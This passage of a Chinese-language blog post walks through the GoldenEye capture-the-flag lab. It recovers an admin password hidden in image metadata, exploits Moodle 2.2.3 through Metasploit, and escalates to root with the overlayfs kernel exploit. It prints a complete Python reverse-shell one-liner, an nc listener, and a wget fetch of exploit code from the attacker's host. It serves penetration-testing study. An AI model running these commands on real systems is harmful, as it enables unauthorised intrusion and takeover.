and License to Kill is the only way to play.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>007,</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>我能够通过clear txt捕获这个应用程序admin 凭据。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>GoldenEye 服务器中的大多数 Web 应用程序中的文本都会被扫描，因此我无法在此处添加凭据。</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>这里有些有趣的东西:/dir007key/for-007.jpg</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>您也可能知道，RCP-90 比任何其他武器都优越得多，而《杀人执照》是唯一的游戏方式。</pre></td></tr></table></figure><p>难道我是 007？🤔</p>\n<p>收集到新目录：/dir007key/for-007.jpg</p>\n<p>去看看：<a href=\"http://severnaya-station.com//dir007key/for-007.jpg\">severnaya-station.com//dir007key/for-007.jpg</a></p>\n<p>一张抽象的图片，通过这张图片能得到 admin 的凭据</p>\n<p>应该是有隐写，下载下来看看</p>\n<p><img loading=\"lazy\" data-src=\"for-007-1715658834141-1.jpg\" alt=\"for-007\" /></p>\n<p>使用 exiftool、binwalk、strings 都行</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>exiftool for-007.jpg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ExifTool Version Number         <span class=\"token builtin class-name\">:</span> <span class=\"token number\">12.76</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>File Name                       <span class=\"token builtin class-name\">:</span> for-007.jpg</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Directory                       <span class=\"token builtin class-name\">:</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>File Size                       <span class=\"token builtin class-name\">:</span> <span class=\"token number\">15</span> kB</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>File Modification Date/Time     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2018</span>:04:25 08:40:02+08:00</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>File Access Date/Time           <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2024</span>:05:14 <span class=\"token number\">11</span>:52:01+08:00</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>File Inode Change Date/Time     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2024</span>:05:14 <span class=\"token number\">11</span>:51:51+08:00</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>File Permissions                <span class=\"token builtin class-name\">:</span> -rw-r--r--</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>File Type                       <span class=\"token builtin class-name\">:</span> JPEG</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>File Type Extension             <span class=\"token builtin class-name\">:</span> jpg</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>MIME Type                       <span class=\"token builtin class-name\">:</span> image/jpeg</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>JFIF Version                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">1.01</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X Resolution                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Y Resolution                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Exif Byte Order                 <span class=\"token builtin class-name\">:</span> Big-endian <span class=\"token punctuation\">(</span>Motorola, MM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Image Description               <span class=\"token builtin class-name\">:</span> <span class=\"token assign-left variable\">eFdpbnRlcjE5OTV4IQ</span><span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Make                            <span class=\"token builtin class-name\">:</span> GoldenEye</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Resolution Unit                 <span class=\"token builtin class-name\">:</span> inches</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Software                        <span class=\"token builtin class-name\">:</span> linux</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Artist                          <span class=\"token builtin class-name\">:</span> For James</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Y Cb Cr Positioning             <span class=\"token builtin class-name\">:</span> Centered</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Exif Version                    <span class=\"token builtin class-name\">:</span> 0231</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Components Configuration        <span class=\"token builtin class-name\">:</span> Y, Cb, Cr, -</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>User Comment                    <span class=\"token builtin class-name\">:</span> For 007</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Flashpix Version                <span class=\"token builtin class-name\">:</span> 0100</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Image Width                     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">313</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>Image Height                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">212</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Encoding Process                <span class=\"token builtin class-name\">:</span> Baseline DCT, Huffman coding</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>Bits Per Sample                 <span class=\"token builtin class-name\">:</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Color Components                <span class=\"token builtin class-name\">:</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Y Cb Cr Sub Sampling            <span class=\"token builtin class-name\">:</span> YCbCr4:4:4 <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Image Size                      <span class=\"token builtin class-name\">:</span> 313x212</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>Megapixels                      <span class=\"token builtin class-name\">:</span> <span class=\"token number\">0.066</span></pre></td></tr></table></figure><p>发现一个 <code>eFdpbnRlcjE5OTV4IQ==</code>  BASE64 加密</p>\n<p>解密后：xWinter1995x!</p>\n<p>应该是得到了培训系统的管理员账号：admin  密码:xWinter1995x!</p>\n<p>尝试登录一下，成功～</p>\n<h2 id=\"2利用漏洞getshell反弹shell\"><a class=\"anchor\" href=\"#2利用漏洞getshell反弹shell\">#</a> 2. 利用漏洞 getshell，反弹 shell</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240514120620071.png\" alt=\"image-20240514120620071\" /></p>\n<p>可以知道 CMS：Moodle 的版本：2.2.3</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514120801418.png\" alt=\"image-20240514120801418\" /></p>\n<p>google 一下 moodle 2.2.3 exp cve</p>\n<p>漏洞详情：<a href=\"https://www.exploit-db.com/exploits/29324\">https://www.exploit-db.com/exploits/29324</a></p>\n<p>CVE：<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-3630\">2013-3630</a></p>\n<p>Description：</p>\n<p>Moodle through 2.5.2 allows remote authenticated administrators to execute arbitrary programs by configuring the aspell pathname and then triggering a spell-check operation within the TinyMCE editor.</p>\n<p>翻译：Moodle 到 2.5.2 允许远程身份验证管理员通过配置 aspell 路径名，然后在 TinyMCE 编辑器中触发拼写检查操作来执行任意程序。</p>\n<p>先用 msf 试一下：</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122244981.png\" alt=\"image-20240514122244981\" /></p>\n<p>搜索一下 Moodle，发现编号 1 就是刚才找的漏洞， <code>use 1</code>  使用这个攻击模块</p>\n<p><code>show options</code>  显示需要配置的选项</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122342560.png\" alt=\"image-20240514122342560\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122423785.png\" alt=\"image-20240514122423785\" /></p>\n<p>Required 显示 yes 的是需要配置的选项：</p>\n<p><code>set password xWinter1995x!</code></p>\n<p><code>set rhosts severnaya-station.com</code></p>\n<p><code>set targeturi /gnocertdir</code></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122827293.png\" alt=\"image-20240514122827293\" /></p>\n<p>配置 payload</p>\n<p><code>set payload cmd/unix/reverse</code></p>\n<p><code>show options</code>  显示要 payload 配置选项</p>\n<p>设置 lhost，反弹 shell 需要回来找的 IP, 填本地 IP  <code>set lhost 192.168.222.132</code> （这里换了切到另一个 kali，所以 IP 与前面不同）</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122950625.png\" alt=\"image-20240514122950625\" /></p>\n<p><code>run</code>  运行，失败了，错误的触发 payload</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/http/moodle_spelling_binary_rce<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Started reverse TCP double handler on <span class=\"token number\">192.168</span>.222.132:4444 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Running automatic check <span class=\"token punctuation\">(</span><span class=\"token string\">\"set AutoCheck false\"</span> to disable<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> The target appears to be vulnerable. Exploitable Moodle version <span class=\"token number\">2.2</span> detected</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Authenticating as user: admin</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Getting session key to update spellchecker <span class=\"token keyword\">if</span> no session key was specified</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Updating spellchecker to use the system <span class=\"token function\">aspell</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Triggering payload</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span> Exploit aborted due to failure: payload-failed: Error triggering payload</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Exploit completed, but no session was created.</pre></td></tr></table></figure><p>看一下详情漏了什么点：<a href=\"https://www.exploit-db.com/exploits/29324\">https://www.exploit-db.com/exploits/29324</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514123958479.png\" alt=\"image-20240514123958479\" /></p>\n<p>我们去系统里看看 editor_tinymce_spellengine 是否设置成 power shell 命令执行</p>\n<p>，果然没有改一下，默认是 Google Spell, 改成 PSpellShell</p>\n<p>Page path:</p>\n<pre><code>Home / ► Site administration / ► Plugins / ► Text editors / ► TinyMCE HTML editor\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514124605570.png\" alt=\"image-20240514124605570\" /></p>\n<p>回到 msf，再 run, 已经成功反弹 shell 了，权限是 www-data</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514124930903.png\" alt=\"image-20240514124930903\" /></p>\n<p>看看有没有 python，可以用 python 构建个 pty 伪终端，方便一些</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240514125711369.png\" alt=\"image-20240514125711369\" /></p>\n<p>另一种反弹方式，按照漏洞详情中那样配置 aspell 路径，触发拼写检查，也试试...</p>\n<p>先配置 aspell 路径:</p>\n<p>Page path:</p>\n<pre><code>Home / ► Site administration / ► Server / ► System paths\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514130924939.png\" alt=\"image-20240514130924939\" /></p>\n<p>改成：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.222.133\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></pre></td></tr></table></figure><p>使用 python 反弹 shell, 反向连接自己...</p>\n<p>nc 监听一下</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-vlp</span> <span class=\"token number\">6666</span>            </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>listening on <span class=\"token punctuation\">[</span>any<span class=\"token punctuation\">]</span> <span class=\"token number\">6666</span> <span class=\"token punctuation\">..</span>.</pre></td></tr></table></figure><p>找到拼写检查进行触发</p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Blogs / ► Add a new entry\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514125927652.png\" alt=\"image-20240514125927652\" /></p>\n<p>反弹成功，构建一下伪终端</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514132031609.png\" alt=\"image-20240514132031609\" /></p>\n<h2 id=\"3提权\"><a class=\"anchor\" href=\"#3提权\">#</a> 3. 提权</h2>\n<p><code>uname -a</code>  查看系统版本 ubuntu 3.13.0</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux ubuntu <span class=\"token number\">3.13</span>.0-32-generic <span class=\"token comment\">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$</pre></td></tr></table></figure><p>找一下 ubuntu 3.13.0 的 exp</p>\n<p>EDB-ID:37292</p>\n<p>CVE:2015-1328</p>\n<p><a href=\"https://www.exploit-db.com/exploits/37292\">https://www.exploit-db.com/exploits/37292</a></p>\n<p>Description:</p>\n<p>The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.</p>\n<p>在 Ubuntu 3.19.0-21.21 到 15.04 版本的 Linux (又名 Linux 内核) 包中的 overlayfs 实现没有正确地检查上层文件系统目录中文件创建的权限，这允许本地用户通过利用一个配置获得 root 访问权限，其中 overlayfs 在任意挂载名称空间中都是允许的。</p>\n<p><code>earchsploit 37292</code>  找一下 kali 中是不是自带这个 exp</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>earchsploit <span class=\"token number\">37292</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> Exploit Title                                                                      <span class=\"token operator\">|</span>  Path</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Linux Kernel <span class=\"token number\">3.13</span>.0 <span class=\"token operator\">&lt;</span> <span class=\"token number\">3.19</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">12.04</span>/14.04/14.10/15.04<span class=\"token punctuation\">)</span> - <span class=\"token string\">'overlayfs'</span> Local Pri <span class=\"token operator\">|</span> linux/local/37292.c</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Shellcodes: No Results</pre></td></tr></table></figure><p>找到了把他复制出来</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c <span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p>看看目标系统有没有 gcc，exp 需要 gcc 编译</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514151350886.png\" alt=\"image-20240514151350886\" /></p>\n<p>发现对方服务器没有 gcc，改一下 exp, 将 gcc 改为 cc</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514151850099.png\" alt=\"image-20240514151850099\" /></p>\n<p>在 exp 所在目录开启一个 http 服务</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> SimpleHTTPServer <span class=\"token number\">8081</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Serving HTTP on <span class=\"token number\">0.0</span>.0.0 port <span class=\"token number\">8081</span> <span class=\"token punctuation\">..</span>.</pre></td></tr></table></figure><p>在反弹的 shell 上将 exp 下载到目标服务器</p>\n<p>一定要切换到 <code>/tmp</code>  目录，不然没权限</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /tmp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>www-data@ubuntu:/tmp$ <span class=\"token function\">wget</span> http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">wget</span> http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>--2024-05-14 00:25:00--  http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Connecting to <span class=\"token number\">192.168</span>.222.133:8081<span class=\"token punctuation\">..</span>. connected.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>HTTP request sent, awaiting response<span class=\"token punctuation\">..</span>. <span class=\"token number\">200</span> OK</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Length: <span class=\"token number\">5120</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span>.0K<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>text/plain<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Saving to: <span class=\"token string\">'37292.c'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">100</span>%<span class=\"token punctuation\">[</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token number\">5,120</span>       --.-K/s   <span class=\"token keyword\">in</span> 0s      </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2024</span>-05-14 00:25:00 <span class=\"token punctuation\">(</span><span class=\"token number\">1.87</span> GB/s<span class=\"token punctuation\">)</span> - <span class=\"token string\">'37292.c'</span> saved <span class=\"token punctuation\">[</span><span class=\"token number\">5120</span>/5120<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>编译 运行，成功获取 root 权限</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cc <span class=\"token number\">37292</span>.c <span class=\"token parameter variable\">-o</span> exp  <span class=\"token comment\"># 编译</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./exp              <span class=\"token comment\"># 运行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">id</span>                 <span class=\"token comment\"># 查看权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,33<span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 拥有 root 权限了</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240514152807565.png\" alt=\"image-20240514152807565\" /></p>\n<h2 id=\"4拿到flag\"><a class=\"anchor\" href=\"#4拿到flag\">#</a> 4. 拿到 flag</h2>\n<p>由前面信息收集所知，flag 在 root 目录下的隐藏文件</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514153323129.png\" alt=\"image-20240514153323129\" /></p>\n<p><code>568628e0d993b1973adc718237da6e93</code>  是个 md5 加密，解密后为 006</p>\n<p>访问 <code>http://severnaya-station.com/006-final/xvf7-flag/</code>  成功拿到 Flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514153643918.png\" alt=\"image-20240514153643918\" /></p>\n<h2 id=\"5总结\"><a class=\"anchor\" href=\"#5总结\">#</a> 5. 总结</h2>\n<p>本次学到的内容</p>\n<ul>\n<li>nmap 的使用\n<ul>\n<li><code>-sS</code>   <code>-sV</code>   <code>-sP</code>   <code> -p-</code>   <code>-A</code>   <code>-T5</code></li>\n</ul>\n</li>\n<li>hydra 的使用\n<ul>\n<li><code>-l</code>   <code> -L</code></li>\n<li><code>-p</code>    <code>-P</code></li>\n<li><code>-s</code></li>\n<li><code>-vV</code></li>\n<li><code>-t</code></li>\n</ul>\n</li>\n<li>msf 一把梭</li>\n<li>图片隐写\n<ul>\n<li>exiftool</li>\n<li>binwalk</li>\n<li>strings</li>\n</ul>\n</li>\n<li>python 构建伪终端</li>\n<li>python 写反弹 shell</li>\n<li>getshell 思路</li>\n<li>提权思路</li>\n<li>渗透测基本思路</li>\n</ul>\n<h3 id=\"nmap用到的命令\"><a class=\"anchor\" href=\"#nmap用到的命令\">#</a> nmap 用到的命令</h3>\n<p><code>-sP</code>  表示主机存活性扫描。不扫描端口。</p>\n<p><code>-p&lt;port&gt;,&lt;port&gt;</code>  扫描指定端口。</p>\n<p><code>-Pn</code>  参数表示不进行主机存活性检测（Ping Scan），而是直接对目标进行端口扫描。</p>\n<p><code>-p-</code>  表示扫描所有端口，即从端口 1 到 65535 的所有端口都会被扫描。</p>\n<p><code>-sS</code> : 表示使用 SYN 扫描（SYN Scan）技术进行端口扫描。它利用 TCP 协议中的 SYN 标志来判断目标主机上的端口是否处于开放状态。</p>\n<p>相比于完全连接扫描（TCP 连接扫描），SYN 扫描的优势在于更快速和更隐蔽。因为 SYN 扫描不需要建立完整的 TCP 连接，只发送一个 SYN 包就能获取目标端口的响应，所以扫描速度更快，并且在目标主机的日志中留下的记录更少，更不容易被检测到。</p>\n<p>然而，一些防火墙和入侵检测系统（IDS）可能会监测到 SYN 扫描活动，并采取相应的防御措施，如限制 SYN 包的发送频率或阻止响应 SYN 包的端口。</p>\n<p><code>-sV</code> : 这个参数指定了进行版本检测（Version Detection）。在端口扫描的基础上， <code>-sV</code>  参数会尝试识别目标主机上运行的服务及其版本信息。</p>\n<p><code>-T5</code> : 这个参数指定了扫描的速度 / 敏感度级别。 <code>-T5</code>  表示使用最高的扫描速度和敏感度（Insane）。这会使扫描速度加快，但也会增加对目标网络和主机的负载和影响。</p>\n<p><code>-A</code>  参数是一个高级选项等价于 <code>-sV -sC -O -T4</code></p>\n<ul>\n<li><code>-sC</code> ：使用默认脚本进行扫描。这个选项会在扫描过程中使用 nmap 默认的脚本来进行漏洞检测和服务识别。</li>\n<li><code>-O</code> ：进行操作系统检测。这个选项会尝试识别目标主机所运行的操作系统类型和版本。</li>\n<li><code>-T4</code> ：设置扫描速度为 Aggressive。这个选项会使 nmap 以较快的速度执行扫描操作，但不会达到最高速度</li>\n</ul>\n<h3 id=\"hydra用到的命令\"><a class=\"anchor\" href=\"#hydra用到的命令\">#</a> hydra 用到的命令</h3>\n<p><code>-l</code>  后面跟用户名，不跟文件，只会匹配这一个用户名。</p>\n<p><code>-L</code>  后面跟文件，每行一个用户名，会匹配文件中的所有用户名。</p>\n<p><code>-p</code>  后面跟密码，不跟文件，只会匹配这一个密码</p>\n<p><code>-P</code>  后面跟文件，每行一个密码，会匹配文件中的所有密码。</p>\n<p><code>-s &lt;port&gt; &lt;server&gt;</code>  后面跟对应端口服务</p>\n<p><code>-vV</code>  显示每次匹配时的详细信息</p>\n",
            "tags": [
                "红队",
                "靶场渗透",
                "红队",
                "打靶",
                "Vulhub"
            ]
        }
    ]
}